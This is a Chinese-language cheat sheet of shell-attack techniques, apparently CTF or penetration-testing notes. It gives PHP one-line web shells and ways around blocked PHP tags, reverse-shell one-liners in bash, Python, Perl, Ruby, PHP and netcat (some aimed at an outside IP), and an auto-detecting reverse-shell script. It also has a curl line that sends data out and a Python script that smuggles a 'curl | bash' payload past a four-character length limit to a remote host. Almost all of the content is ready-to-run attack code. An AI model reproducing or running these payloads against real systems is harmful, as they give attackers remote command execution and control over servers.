# Shell

## 几种特殊符号

1. 反引号 `` ` ``
2. 文件重定向符 `` > <``
3. 环境变量 ``${}``

## PHP

一句话：

```php
<?php eval($_REQUEST['eki']);?>
```

``eval``也可以改成``system、assert``

### Bypass:

1. 当仅禁用``<?php``时，可以使用``<?    ?> ``
    
   要求：需要开启短标签开关，``short_open_tag``

2. 当禁用``<?php``以及``?>``时，还可以使用``<?=``不需要闭合标签 
    
    要求：PHP版本>PHP 5.4.0

3. 禁用了``<?、 <?php、 ?>``时，可以使用asp标签``<%  %>``

    要求：asp_tags设成On


4. ``<script language="php">system($_REQUEST['eki']);</script>`` 
   
    等价于``<?php system($_REQUEST['eki']);?>``

    要求：php7之前

命令行反弹Shell

```bash
php -r '$sock=fsockopen("127.0.0.1",2333);exec("/bin/sh -i <&3 >&3 2>&3");
```

curl
```bash
curl http://127.0.0.1:2333/ -d `ls /`;
```

## BASH

```bash
bash -i >& /dev/tcp/127.0.0.1/233 0>&1
```

Ex: (自动根据环境来反弹shell)

```
if command -v python > /dev/null 2>&1; then python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("174.1.69.127",2333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' exit; fi if command -v perl > /dev/null 2>&1; then perl -e 'use Socket;$i="174.1.69.127";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' exit; fi if command -v nc > /dev/null 2>&1; then rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 174.1.69.127 2333 >/tmp/f exit; fi if command -v sh > /dev/null 2>&1; then /bin/sh -i >& /dev/tcp/174.1.69.127/2333 0>&1 exit; fi
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

## Perl

```perl
perl -e 'use Socket;$i="127.0.0.1";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",233).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat

```bash
nc -e /bin/sh 127.0.0.1 2333
```

正向弹

靶机：
```bash
nc -lvvp 2333 -e /bin/bash
```

攻击机
```
nc ip 2333
```
## 获取Bash交互行

```
python -c "import pty;pty.spawn('/bin/bash')"
```

## 字符限制绕过

以hackme为例

```python
import requests
from time import sleep
from urllib import quote
import base64

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir', 
    '>sl', 
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate "curl <IPHEX> | ba sh;"
    # 
    '>\;',  
    '>sh\\',
    '>ba\\', 
    '>\|\\',
    '>XX\\', 
    '>XX\\', 
    '>XX\\', 
    '>XX\\',
    '>0x\\',
    '>\ \\', 
    '>rl\\',
    '>cu\\',

    'sh x', 
    'sh g',
]


for i in payload:
    assert len(i) <= 4
    header ={
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Cookie":"PHPSESSID=1af6e5b03d0df7c07ae2e548bd44183c"
    }
    data ={
        "url":"compress.zlib://data:@127.0.0.1/plain;base64,"+base64.b64encode(i)
    }
    r = requests.post(url='http://121.36.222.22:88/core/index.php',data=data,headers=header)
    print r.text
    print i
    sleep(0.1)
```

## 绕过cat

1. ``\``
2. ``rev,more``
3. ``tac``